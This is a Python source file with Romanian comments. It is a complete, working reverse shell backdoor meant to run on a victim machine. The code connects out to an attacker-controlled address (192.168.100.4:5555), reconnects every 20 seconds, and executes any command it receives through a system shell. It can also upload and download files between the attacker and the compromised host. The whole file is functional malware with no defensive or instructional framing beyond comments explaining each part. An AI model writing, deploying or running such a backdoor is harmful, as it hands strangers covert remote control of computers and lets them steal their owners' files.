import socket #Permite programului să creeze conexiuni de rețea.
import json #Transformă datele în format JSON.
import time #Introduce întârzieri.
import subprocess #Permite programului să ruleze comenzi de sistem.
import os #Utilizează funcții dependente de sistemul de operare.

SERVER_IP = '192.168.100.4'  #IP-ul de la mașina atacatoare.
SERVER_PORT = 5555


def reliable_send(data):
    json_data = json.dumps(data)
    target_sock.send(json_data.encode())

#Trimite datele la mașina atacatoare și le transformă în format JSON.

def reliable_recv():
    data = ''
    while True:
        try:
            data = data + target_sock.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

#Primește datele de la mașina atacatoare și se asigură că este corectă în format JSON.

def connection():
    while True:
        time.sleep(20)
        try:
            target_sock.connect((SERVER_IP, SERVER_PORT))
            shell()
            target_sock.close()
            break
        except:
            connection()

#Mașinile se reconectează la fiecare 20 sec.

def upload_file(filename):
    file = open(filename, 'rb')
    target_sock.send(file.read())
    file.close()

#De pe mașina atacatoare poți transmite file-uri pe mașina atacată.

def download_file(filename):
    file = open(filename, 'wb')
    target_sock.settimeout(1)
    chunk = target_sock.recv(1024)
    while chunk:
        file.write(chunk)
        try:
            chunk = target_sock.recv(1024)
        except socket.timeout:
            break
    target_sock.settimeout(None)
    file.close()

#Descarcă fișiere de pe mașina atacată.

def shell():
    while True:
        command = reliable_recv()
        if command == 'quit':
            break
        elif command == 'clear':
            pass
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
        elif command[:9] == 'download ':
            upload_file(command[9:])
        elif command[:7] == 'upload ':
            download_file(command[7:])
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                       stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)

#Primește comenzile de la mașina atacatoare și le execută pe calculatorul atacat.

target_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()

#Creează un socket de rețea și începe procesul de conectare.